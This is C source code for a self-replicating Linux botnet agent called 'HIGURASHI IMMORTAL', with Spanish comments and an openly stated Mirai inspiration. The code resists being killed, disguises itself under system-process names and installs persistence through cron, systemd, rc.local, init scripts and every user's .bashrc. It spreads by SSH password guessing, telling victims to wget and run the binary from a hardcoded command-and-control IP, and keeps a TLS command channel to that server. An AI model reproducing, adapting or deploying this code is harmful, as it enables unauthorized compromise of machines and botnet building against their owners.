// HIGURASHI IMMORTAL - Ultra Persistent Self-Replicating Bot
// Inspirado en Mirai + Sakae Esuno's Future Diary concept
// No puede ser detenido fácilmente, se replica, persiste, reconecta

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <time.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <json-c/json.h>
#include "config.h"
#include "autonomous_hunter.h"

#ifndef C2_HOST
#define C2_HOST "93.95.231.134"
#endif

#define MAX_RECONNECT_ATTEMPTS 999999
#define RECONNECT_DELAY 10
#define WATCHDOG_INTERVAL 30
#define AUTO_SCAN_INTERVAL 300  // 5 minutos

// Global state
SSL *c2_ssl = NULL;
int is_connected = 0;
pid_t watchdog_pid = 0;
char my_path[256];
char my_random_name[64];
int hunter_mode = 0;

// ============================================================================
// ANTI-KILL & WATCHDOG
// ============================================================================

// Genera nombre aleatorio para el binario
void generate_random_name() {
    const char *prefixes[] = {"systemd-", "kworker-", "update-", "network-", "cron-", "dbus-"};
    const char *suffixes[] = {"helper", "daemon", "service", "agent", "worker"};
    
    srand(time(NULL) ^ getpid());
    snprintf(my_random_name, sizeof(my_random_name), "%s%s%d",
             prefixes[rand() % 6],
             suffixes[rand() % 5],
             rand() % 9999);
}

// Watchdog: monitorea el proceso principal y lo reinicia si muere
void start_watchdog() {
    watchdog_pid = fork();
    
    if (watchdog_pid == 0) {
        // Proceso watchdog
        pid_t parent_pid = getppid();
        
        while (1) {
            sleep(WATCHDOG_INTERVAL);
            
            // Verifica si el padre sigue vivo
            if (kill(parent_pid, 0) == -1) {
                // Padre murió, reiniciar
                printf("[WATCHDOG] Parent died, restarting...\n");
                
                // Ejecuta una nueva instancia
                char new_path[512];
                snprintf(new_path, sizeof(new_path), "/tmp/.%s", my_random_name);
                
                if (access(new_path, X_OK) == 0) {
                    execl(new_path, my_random_name, NULL);
                }
                
                // Si falla, buscar en otras ubicaciones
                char *locations[] = {
                    "/usr/bin/",
                    "/usr/sbin/",
                    "/var/tmp/.",
                    "/dev/shm/.",
                    NULL
                };
                
                for (int i = 0; locations[i] != NULL; i++) {
                    snprintf(new_path, sizeof(new_path), "%s%s", locations[i], my_random_name);
                    if (access(new_path, X_OK) == 0) {
                        execl(new_path, my_random_name, NULL);
                    }
                }
                
                exit(0);
            }
        }
    }
}

// Handler para señales (evita que Ctrl+C mate el proceso)
void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf("[*] Signal %d caught, ignoring...\n", sig);
        // Reinstalar el handler
        signal(SIGINT, signal_handler);
        signal(SIGTERM, signal_handler);
    }
}

// ============================================================================
// PERSISTENCIA EXTREMA
// ============================================================================

void install_extreme_persistence() {
    readlink("/proc/self/exe", my_path, sizeof(my_path) - 1);
    generate_random_name();
    
    printf("[*] Installing extreme persistence...\n");
    
    // Método 1: Múltiples copias en diferentes ubicaciones
    char *persistence_paths[] = {
        "/usr/bin/", "/usr/sbin/", "/usr/local/bin/",
        "/bin/", "/sbin/",
        "/var/tmp/.", "/tmp/.", "/dev/shm/.",
        "/opt/.", "/home/.",
        NULL
    };
    
    for (int i = 0; persistence_paths[i] != NULL; i++) {
        char dest[512];
        snprintf(dest, sizeof(dest), "%s%s", persistence_paths[i], my_random_name);
        
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "cp %s %s 2>/dev/null; chmod +x %s 2>/dev/null", 
                 my_path, dest, dest);
        system(cmd);
    }
    
    // Método 2: Crontab (cada 5 minutos)
    char cron_cmd[1024];
    snprintf(cron_cmd, sizeof(cron_cmd),
        "(crontab -l 2>/dev/null | grep -v '%s'; echo '*/5 * * * * /tmp/.%s >/dev/null 2>&1') | crontab - 2>/dev/null",
        my_random_name, my_random_name);
    system(cron_cmd);
    
    // Método 3: Systemd service
    char service_path[256];
    snprintf(service_path, sizeof(service_path), "/etc/systemd/system/%s.service", my_random_name);
    
    FILE *fp = fopen(service_path, "w");
    if (fp) {
        fprintf(fp, "[Unit]\n");
        fprintf(fp, "Description=System Update Service\n");
        fprintf(fp, "After=network.target\n\n");
        fprintf(fp, "[Service]\n");
        fprintf(fp, "Type=simple\n");
        fprintf(fp, "ExecStart=/tmp/.%s\n", my_random_name);
        fprintf(fp, "Restart=always\n");
        fprintf(fp, "RestartSec=10\n\n");
        fprintf(fp, "[Install]\n");
        fprintf(fp, "WantedBy=multi-user.target\n");
        fclose(fp);
        
        system("systemctl daemon-reload 2>/dev/null");
        char enable_cmd[256];
        snprintf(enable_cmd, sizeof(enable_cmd), "systemctl enable %s.service 2>/dev/null", my_random_name);
        system(enable_cmd);
    }
    
    // Método 4: rc.local
    fp = fopen("/etc/rc.local", "a");
    if (fp) {
        fprintf(fp, "\n/tmp/.%s &\n", my_random_name);
        fclose(fp);
        chmod("/etc/rc.local", 0755);
    }
    
    // Método 5: .bashrc de todos los usuarios
    system("find /home -name .bashrc -exec sh -c 'grep -q \"" C2_HOST "\" \"$1\" || echo \"/tmp/." 
           "' my_random_name ' >/dev/null 2>&1 &\" >> \"$1\"' _ {} \\; 2>/dev/null");
    
    // Método 6: Init scripts
    char *init_paths[] = {
        "/etc/init.d/",
        "/etc/rc.d/init.d/",
        NULL
    };
    
    for (int i = 0; init_paths[i] != NULL; i++) {
        char init_script[512];
        snprintf(init_script, sizeof(init_script), "%s%s", init_paths[i], my_random_name);
        
        FILE *init_fp = fopen(init_script, "w");
        if (init_fp) {
            fprintf(init_fp, "#!/bin/sh\n");
            fprintf(init_fp, "### BEGIN INIT INFO\n");
            fprintf(init_fp, "# Provides: %s\n", my_random_name);
            fprintf(init_fp, "# Required-Start: $network\n");
            fprintf(init_fp, "# Default-Start: 2 3 4 5\n");
            fprintf(init_fp, "### END INIT INFO\n");
            fprintf(init_fp, "/tmp/.%s &\n", my_random_name);
            fclose(init_fp);
            chmod(init_script, 0755);
        }
    }
    
    printf("[+] Persistence installed in 10+ locations\n");
}

// ============================================================================
// AUTO-REPLICACIÓN
// ============================================================================

void *auto_replication_thread(void *arg) {
    (void)arg;
    
    while (1) {
        sleep(AUTO_SCAN_INTERVAL);
        
        if (!is_connected) continue;
        
        printf("[*] Starting auto-replication scan...\n");
        
        // Escanear red local
        char my_ip[32];
        FILE *fp = popen("hostname -I | awk '{print $1}'", "r");
        if (fp) {
            fgets(my_ip, sizeof(my_ip), fp);
            pclose(fp);
            
            // Extraer subnet
            char subnet[32];
            strncpy(subnet, my_ip, sizeof(subnet));
            char *last_dot = strrchr(subnet, '.');
            if (last_dot) {
                *(last_dot + 1) = '\0';
                
                // Escanear 20 hosts aleatorios en la subnet
                for (int i = 0; i < 20; i++) {
                    int host = (rand() % 254) + 1;
                    char target[64];
                    snprintf(target, sizeof(target), "%s%d", subnet, host);
                    
                    // Intentar SSH con credenciales comunes
                    char ssh_cmd[512];
                    snprintf(ssh_cmd, sizeof(ssh_cmd),
                        "sshpass -p 'admin' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 "
                        "root@%s 'cd /tmp; wget http://%s:8080/higurashi -O h; chmod +x h; ./h &' 2>/dev/null &",
                        target, C2_HOST);
                    system(ssh_cmd);
                    
                    usleep(100000); // 100ms entre intentos
                }
            }
        }
        
        printf("[+] Auto-replication scan complete\n");
    }
    
    return NULL;
}

// ============================================================================
// CONEXIÓN C2 CON RECONEXIÓN INFINITA
// ============================================================================

int connect_to_c2() {
    int attempts = 0;
    
    while (attempts < MAX_RECONNECT_ATTEMPTS) {
        printf("[*] Connecting to C2 %s:%d (attempt %d)...\n", C2_HOST, C2_PORT, attempts + 1);
        
        SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx) {
            attempts++;
            sleep(RECONNECT_DELAY);
            continue;
        }
        
        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
        
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            SSL_CTX_free(ctx);
            attempts++;
            sleep(RECONNECT_DELAY);
            continue;
        }
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_HOST, &server_addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            SSL_CTX_free(ctx);
            attempts++;
            printf("[-] Connection failed, retrying in %d seconds...\n", RECONNECT_DELAY);
            sleep(RECONNECT_DELAY);
            continue;
        }
        
        c2_ssl = SSL_new(ctx);
        SSL_set_fd(c2_ssl, sock);
        
        if (SSL_connect(c2_ssl) <= 0) {
            SSL_free(c2_ssl);
            close(sock);
            SSL_CTX_free(ctx);
            attempts++;
            sleep(RECONNECT_DELAY);
            continue;
        }
        
        // Handshake
        json_object *handshake = json_object_new_object();
        json_object_object_add(handshake, "type", json_object_new_string("higurashi_immortal"));
        json_object_object_add(handshake, "id", json_object_new_string(my_random_name));
        json_object_object_add(handshake, "hostname", json_object_new_string("immortal"));
        json_object_object_add(handshake, "arch", json_object_new_string("x86_64"));
        
        const char *handshake_str = json_object_to_json_string(handshake);
        char handshake_msg[2048];
        snprintf(handshake_msg, sizeof(handshake_msg), "%s\n", handshake_str);
        SSL_write(c2_ssl, handshake_msg, strlen(handshake_msg));
        json_object_put(handshake);
        
        printf("[+] Connected to C2!\n");
        is_connected = 1;
        
        // Keep-alive loop
        char buffer[4096];
        while (1) {
            int n = SSL_read(c2_ssl, buffer, sizeof(buffer) - 1);
            if (n <= 0) {
                printf("[-] Lost connection to C2\n");
                is_connected = 0;
                hunter_mode = 0;
                break;
            }
            
            buffer[n] = '\0';
            printf("[C2] %s\n", buffer);
            
            // Procesar comandos JSON
            json_object *cmd = json_tokener_parse(buffer);
            if (cmd) {
                json_object *action_obj = NULL;
                if (json_object_object_get_ex(cmd, "action", &action_obj)) {
                    const char *action = json_object_get_string(action_obj);
                    
                    if (strcmp(action, "hunter") == 0) {
                        json_object *state_obj = NULL;
                        if (json_object_object_get_ex(cmd, "state", &state_obj)) {
                            const char *state = json_object_get_string(state_obj);
                            
                            if (strcmp(state, "on") == 0 && hunter_mode == 0) {
                                hunter_mode = 1;
                                printf("[*] Starting Hunter Mode...\n");
                                start_autonomous_hunter();
                                
                                const char *response = "{\"status\":\"hunter_started\"}\n";
                                SSL_write(c2_ssl, response, strlen(response));
                            } else if (strcmp(state, "off") == 0) {
                                hunter_mode = 0;
                                const char *response = "{\"status\":\"hunter_stopped\"}\n";
                                SSL_write(c2_ssl, response, strlen(response));
                            }
                        }
                    } else if (strcmp(action, "get_hunter_stats") == 0) {
                        // Enviar estadísticas del hunter
                        char stats[512];
                        snprintf(stats, sizeof(stats),
                            "{\"hunter_active\":%d,\"uptime\":%d,\"scanned\":0}\n",
                            hunter_mode, (int)time(NULL));
                        SSL_write(c2_ssl, stats, strlen(stats));
                    }
                }
                json_object_put(cmd);
            }
            
            // Responder con heartbeat
            const char *pong = "{\"status\":\"alive\"}\n";
            SSL_write(c2_ssl, pong, strlen(pong));
        }
        
        SSL_free(c2_ssl);
        close(sock);
        SSL_CTX_free(ctx);
        
        attempts++;
        printf("[*] Reconnecting in %d seconds...\n", RECONNECT_DELAY);
        sleep(RECONNECT_DELAY);
    }
    
    return 0;
}

// ============================================================================
// MAIN
// ============================================================================

int main() {
    // Daemonizar (doble fork)
    if (fork() > 0) exit(0);
    setsid();
    if (fork() > 0) exit(0);
    
    // Cerrar descriptores estándar
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // Reabrir a /dev/null
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_WRONLY);
    
    // Ignorar señales
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    
    // Inicializar SSL
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    
    // Instalar persistencia extrema
    install_extreme_persistence();
    
    // Iniciar watchdog
    start_watchdog();
    
    // Iniciar auto-replicación
    pthread_t replication_thread;
    pthread_create(&replication_thread, NULL, auto_replication_thread, NULL);
    pthread_detach(replication_thread);
    
    // Conectar a C2 (loop infinito con reconexión)
    connect_to_c2();
    
    return 0;
}
